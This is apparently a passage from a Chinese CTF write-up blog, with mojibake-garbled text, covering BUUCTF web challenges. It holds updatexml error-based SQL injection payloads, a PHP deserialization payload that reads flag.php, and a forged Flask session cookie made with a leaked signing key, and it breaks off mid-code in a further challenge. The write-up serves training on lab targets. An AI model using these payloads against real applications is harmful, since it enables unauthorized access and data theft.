<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">left</span>(<span class="keyword">password</span>,<span class="number">30</span>))<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>ä¸ºä»€ä¹ˆè¿™é‡Œleftå‡½æ•°æ˜¾ç¤º30ä¸ªå­—ç¬¦ï¼Œå› ä¸º0x7eä¹Ÿå°±æ˜¯<del>ä¹Ÿæ˜¯å­—ç¬¦ï¼Œ</del>å·²ç»å äº†ä¸¤ä½ï¼Œæ‰€ä»¥è¿˜å¯ä»¥æ˜¾ç¤º30ä½</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220821220007687.png" alt="image-20220821220007687"></p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">right</span>(<span class="keyword">password</span>,<span class="number">30</span>))<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>))%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/21/buuctf-wp/image-20220821220041922.png" alt="image-20220821220041922"></p>
<p>å› ä¸ºæ˜¯å·¦å³æ˜¾ç¤º30ä½ï¼Œæ‰€ä»¥flagå†…å®¹æœ‰é‡å ï¼Œæ•´ç†ä¸€ä¸‹</p>
<p>å¾—åˆ°flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MAXIMA"><figure class="iseeu highlight /maxima"><table><tr><td class="code"><pre><span class="line">flag&#123;<span class="number">034eb054</span>-<span class="number">83b5</span>-412c-b90e-afc72c6ce998&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="6-ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz1"><a href="#6-ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz1" class="headerlink" title="6.[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz1"></a>6.[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz1</h2><p>1)é¢˜ç›®æè¿°</p>
<p>æ— </p>
<p>2)wp</p>
<p>ä¸€é“å…¸å‹çš„åºåˆ—åŒ–é¢˜ç›®</p>
<p>å…ˆå¯¹ä»£ç è¿›è¡Œåˆ†æ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>__construct()å‡½æ•°æ²¡æœ‰ç”¨ï¼Œä¸å‚ä¸åºåˆ—åŒ–ä¸­</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ord() å‡½æ•°è¿”å›å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ ASCII å€¼ã€‚</span></span><br><span class="line"><span class="comment">// ASCIIå€¼32ä¸º2ï¼ŒASCIIå€¼125ä¸º%</span></span><br></pre></td></tr></table></figure></div>

<p>è¿™ä¸ªå‡½æ•°ä¸»è¦æ˜¯è¿‡æ»¤æ‰protectç±»çš„æˆå‘˜,åœ¨åºåˆ—åŒ–çš„æ—¶å€™æ˜¯ä»¥%00ä½œä¸ºæ ‡è¯†ç¬¦</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LASSO"><figure class="iseeu highlight /lasso"><table><tr><td class="code"><pre><span class="line">*ä½†æ˜¯åœ¨PHPç‰ˆæœ¬å¤§äº<span class="number">7.1</span>çš„æƒ…å†µä¸‹ï¼Œ<span class="keyword">protect</span>ç±»å’Œ<span class="keyword">public</span>ç±»æ²¡ä»€ä¹ˆå¥½æ³¨æ„çš„ï¼Œæ‰€ä»¥åœ¨æ„é€ åºåˆ—åŒ–æ—¶æ”¹ä¸º<span class="keyword">public</span>å¯ä»¥ç»•è¿‡is_validå‡½æ•°</span><br></pre></td></tr></table></figure></div>



<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>__destruc()å‡½æ•°ä¸»è¦æ˜¯ä¸è®©<code>op===&quot;2&quot;</code>ï¼Œä½†æ˜¯åœ¨processå‡½æ•°é‡Œopåˆè¦ä¸ºâ€œ2â€</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>æ‰€ä»¥è¿™é‡Œåˆ©ç”¨å¼ºå¼±ç±»å‹æ¯”è¾ƒï¼Œ__destruc()å‡½æ•°é‡Œopæ˜¯ä¸èƒ½ä¸º2ï¼Œä½†æ˜¯æ˜¯å¼ºç±»å‹æ¯”è¾ƒï¼Œæ˜¯å­—ç¬¦2ã€â€2â€ã€‘,æ‰€ä»¥op=2ã€æ•°å­—2ã€‘ï¼Œå°±ç»•è¿‡è¾¾åˆ°è¯»å–flag.phpçš„ç»“æœ</p>
<p>äºæ˜¯æ„é€ å‡ºphpåºåˆ—åŒ–</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>å¾—åˆ°åºåˆ—åŒ–ç»“æœ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>ï¼š&#123;s:<span class="number">2</span>:<span class="string">&quot;op&quot;</span>;i:<span class="number">2</span>;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure></div>

<p>è®¿é—®ï¼ŒF12æŸ¥çœ‹ã€æˆ–è€…æ”¹ä¸€ä¸‹filenameçš„å€¼ä¸ºphp://filterä¼ªåè®®ï¼Œç”¨base64ï¼Œå¯ä»¥ç›´æ¥çœ‹åˆ°ã€‘</p>
<p><code>http://f20b2545-8ff3-4a33-887f-27f4901db96a.node4.buuoj.cn:81/?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code></p>
<p>å¾—åˆ°flag</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220822135717175.png" alt="image-20220822135717175"></p>
<h2 id="7-HCTF-2018-admin"><a href="#7-HCTF-2018-admin" class="headerlink" title="7.[HCTF 2018]admin"></a>7.[HCTF 2018]admin</h2><h3 id="1-é¢˜ç›®æè¿°-4"><a href="#1-é¢˜ç›®æè¿°-4" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2-wp-4"><a href="#2-wp-4" class="headerlink" title="2)wp"></a>2)wp</h3><p>è¿™é“é¢˜å¼€å§‹å½“ä½œå¼±å¯†ç é¢˜è§£ï¼Œç»“æœç›´æ¥çˆ†ç ´å‡ºæ¥äº†</p>
<p>ç”¨æˆ·åï¼šadmin</p>
<p>å¯†ç ï¼š123</p>
<p>è¿™æ ·åº”è¯¥æœ€ç®€å•çš„æ–¹æ³•äº†</p>
<p>ä½†æˆ‘çœ‹äº†çœ‹å…¶ä»–å¤§ä½¬wpï¼Œä»–ä»¬æŠŠè¿™ä¸ªå½“ä½œflask_sessionä¼ªé€ çš„é¢˜ç›®</p>
<p>å­¦ä¹ ä¸€ä¸‹</p>
<p>å…ˆæ³¨å†Œä¸€ä¸ªè¯•è¯•</p>
<p>ç”¨æˆ·åï¼šadmin123</p>
<p>å¯†ç ï¼š123456</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220822203857056.png" alt="image-20220822203857056"></p>
<p>åªåœ¨<code>change password</code>çš„æºç çœ‹åˆ°çº¿ç´¢ï¼ŒçŸ¥é“æ˜¯flaskæ¡†æ¶</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220822203848108.png" alt="image-20220822203848108"></p>
<p>è®¿é—®ä¸‹è½½æ–‡ä»¶</p>
<p>flaskå­˜åœ¨ä¸€ä¸ªsessionä¼ªé€ æ¼æ´</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">flaskçš„<span class="keyword">session</span>ä¿å­˜åœ¨å®¢æˆ·ç«¯ï¼Œä¸€èˆ¬åªæ˜¯åŠ äº†ç­¾åæ¥é˜²æ­¢è¢«æˆªå–ä¿®æ”¹ï¼Œä½†æ˜¯å¦‚æœæ²¡æœ‰åŠ å¯†æˆ‘ä»¬å°±å¯ä»¥å¯¹<span class="keyword">session</span>è¿›è¡Œè§£ç æ¥è·å–å…¶ä¸­çš„ç”¨æˆ·æ•°æ®ã€‚ </span><br><span class="line"></span><br><span class="line">å¦‚æœæˆ‘ä»¬åœ¨è·å–åˆ°ç­¾åçš„ç§˜é’¥ï¼Œå°±å¯ä»¥æŒ‰ç…§è§£ç å‡ºæ¥çš„æ•°æ®è¿›è¡Œä¼ªé€ ï¼Œé‡æ–°ç”Ÿæˆç­¾åçš„<span class="keyword">session</span>æ¥è¾¾åˆ°æ¬ºéª—æœåŠ¡ç«¯ã€‚  </span><br><span class="line"></span><br><span class="line">flaskçš„<span class="keyword">session</span>ä½¿ç”¨base64å¯¹bytesç±»å‹çš„ç”¨æˆ·æ•°æ®è¿›è¡Œç¼–ç ï¼Œè€Œä¸”ç¼–ç ä¹‹å‰å¯èƒ½è¿›è¡Œäº†å‹ç¼©(<span class="keyword">session</span>ä»¥ &quot;.&quot;  å¼€å¤´æ—¶è¡¨ç¤ºè¿›è¡Œäº†å‹ç¼©) flask ä¿å­˜åœ¨cookieé‡Œé¢çš„<span class="keyword">session</span>ä¸€èˆ¬æ ¼å¼ä¸º data.timestamp.signature</span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œçš„sessionæ²¡æœ‰åŠ å¯†ï¼Œåœ¨config.pyä¸­å¾—åˆ°äº†ç­¾åç§˜é’¥<code>ckj123</code>ï¼Œäºæ˜¯æˆ‘ä»¬å°±å¯ä»¥é‡æ–°ç”Ÿæˆsessionï¼Œæ¥æ¬ºéª—æœåŠ¡å™¨</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220822204409898.png" alt="image-20220822204409898"></p>
<p>åˆ©ç”¨cookie editoræŸ¥çœ‹sessionå€¼</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220822231718091.png" alt="image-20220822231718091"></p>
<p>ç„¶åå†æ‰¾å‘ç°index.htmlä¸‹æœ‰flagæç¤º</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220823000533344.png" alt="image-20220823000533344"></p>
<p>ç®€å•åˆ†æä¸€ä¸‹ï¼Œå°±æ˜¯è®©sessioné‡Œçš„name==â€adminâ€</p>
<p>æ‰€ä»¥è¿™é‡Œå°±éœ€è¦ä¿®æ”¹ä¸€ä¸‹æˆ‘ä»¬å¾—åˆ°çš„session</p>
<p>è¿™é‡Œå»ºè®®äº†è§£ä¸€ä¸‹ä¸€ä¸ªå·¥å…·<code>flask-session-cookie-manager-master</code>èƒ½å¯¹å…¶è¿›è¡ŒåŠ å¯†è§£ç ã€å¯èƒ½éœ€è¦pipä¸‹ä¸€äº›æ¨¡å—ï¼Œç™¾åº¦å¯ä»¥è§£å†³ã€‘</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">è§£å¯†</span><br><span class="line"><span class="keyword">python</span> flask_session_cookie_manager3.<span class="keyword">py</span> decode -s â€œcxk123â€ -<span class="keyword">c</span> â€œä½ åœ¨<span class="keyword">change</span>é¡µé¢çš„sessionå€¼â€</span><br><span class="line">åŠ å¯†</span><br><span class="line"><span class="keyword">python</span> flask_session_cookie_manager3.<span class="keyword">py</span> encode -s â€œcxk123â€ -t â€œæŒ‰ç…§å¾—åˆ°è§£å¯†ç»“æœæ ¼å¼æ”¹çš„ç»“æœâ€</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/buuctf-wp/image-20220822235758750.png" alt="image-20220822235758750"></p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;_fresh&#x27;: False, &#x27;_id&#x27;: b&#x27;b83a7c28f514d37ed353fb8dd5a8febd<span class="number">8703</span>c5b8b2d40b<span class="number">535487</span>2c13dd<span class="number">4314</span>cccf<span class="number">9116</span>d2dcd<span class="number">6598</span>7e5f08b2d6cffdf72cb<span class="number">7660</span>baeb7d5e76f3ac<span class="number">2465</span>a956f03f&#x27;, &#x27;csrf_token&#x27;: b&#x27;c975b<span class="number">3523</span>4b<span class="number">704019</span>c94accb0ff54e774dcaae68&#x27;, &#x27;image&#x27;: b&#x27;cxf4&#x27;, &#x27;name&#x27;: &#x27;admin123&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br><span class="line"></span><br><span class="line">æŠŠæˆ‘ä»¬çš„ç”¨æˆ·åæ”¹ä¸ºadmin</span><br><span class="line"></span><br><span class="line">&#123;&#x27;_fresh&#x27;: False, &#x27;_id&#x27;: b&#x27;b83a7c28f514d37ed353fb8dd5a8febd<span class="number">8703</span>c5b8b2d40b<span class="number">535487</span>2c13dd<span class="number">4314</span>cccf<span class="number">9116</span>d2dcd<span class="number">6598</span>7e5f08b2d6cffdf72cb<span class="number">7660</span>baeb7d5e76f3ac<span class="number">2465</span>a956f03f&#x27;, &#x27;csrf_token&#x27;: b&#x27;c975b<span class="number">3523</span>4b<span class="number">704019</span>c94accb0ff54e774dcaae68&#x27;, &#x27;image&#x27;: b&#x27;cxf4&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åå†åŠ å¯†</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220823000020825.png" alt="image-20220823000020825"></p>
<p>ç„¶åcookie editorä¿®æ”¹ä¸ºæˆ‘ä»¬åŠ å¯†ç»“æœ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GCODE"><figure class="iseeu highlight /gcode"><table><tr><td class="code"><pre><span class="line">.eJxFUMtu<span class="name">g0</span>AM_JXK<span class="number">5</span>xx<span class="number">4</span>tBekHCKRIiqtEWgJ<span class="number">8</span>l<span class="number">4</span>iGkjAy<span class="number">1</span>IJWlE<span class="number">2</span>yr<span class="number">93</span><span class="name">m1</span>bKwQd<span class="number">7</span>xvbMXOF<span class="number">4</span><span class="symbol">ntq5</span>g-hcD<span class="number">3</span><span class="meta">O7</span>gWPfQHSFp<span class="number">3</span>eIgPhiSTYsuDM<span class="meta">o956</span>KRaiq<span class="number">3</span>KJEQ<span class="number">9</span>xpFR<span class="number">-6</span>LFEDmfwZ<span class="number">7</span>c<span class="number">6</span>SPfRZkq<span class="number">4</span>qzhfi<span class="number">0</span>vF<span class="number">-528</span>sJDpuboUsmAI<span class="number">0</span>mdx_<span class="meta">o8</span>lXlaBGLl-yuBmwouVvV<span class="number">7</span>EySis-rRSkITItZF<span class="number">4</span>H<span class="number">4</span>kZjVYbus<span class="number">6</span>VKrBiTT<span class="number">1</span>L<span class="number">7</span>rl<span class="number">9</span>EQFu<span class="number">4</span>beA<span class="number">0</span>T-fj<span class="number">54</span>dux<span class="number">4</span>cFq<span class="number">0</span>OsUifFVZKGwkkTcuBMFp<span class="number">2</span>T<span class="number">0</span>otEOWvFgPbkOTkdVWWQ<span class="number">7</span>bb<span class="number">3</span>c<span class="number">72</span>pL<span class="number">-3</span>jUuhC-Ef<span class="name">G2</span>jgA<span class="number">6</span>sb<span class="number">0</span>I<span class="number">2</span>zga<span class="number">26</span><span class="symbol">ne27</span><span class="keyword">ge</span><span class="number">3</span>D<span class="number">7</span>AeD<span class="number">4</span>b<span class="number">34.</span>YwOoDA.quyfjg-Miz<span class="number">9</span>Y<span class="number">5</span>cx<span class="number">6</span>i<span class="number">5</span>hTVr<span class="number">0</span>EWjE</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/buuctf-wp/image-20220823000303547.png" alt="image-20220823000303547"></p>
<p>å¾—åˆ°flag</p>
<h2 id="8-ZJCTF-2019-NiZhuanSiWei"><a href="#8-ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="8.[ZJCTF 2019]NiZhuanSiWei"></a>8.[ZJCTF 2019]NiZhuanSiWei</h2><h3 id="1-é¢˜ç›®æè¿°-5"><a href="#1-é¢˜ç›®æè¿°-5" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2-wp-5"><a href="#2-wp-5" class="headerlink" title="2)wp"></a>2)wp</h3><p>å…ˆåˆ†æä¸€ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the 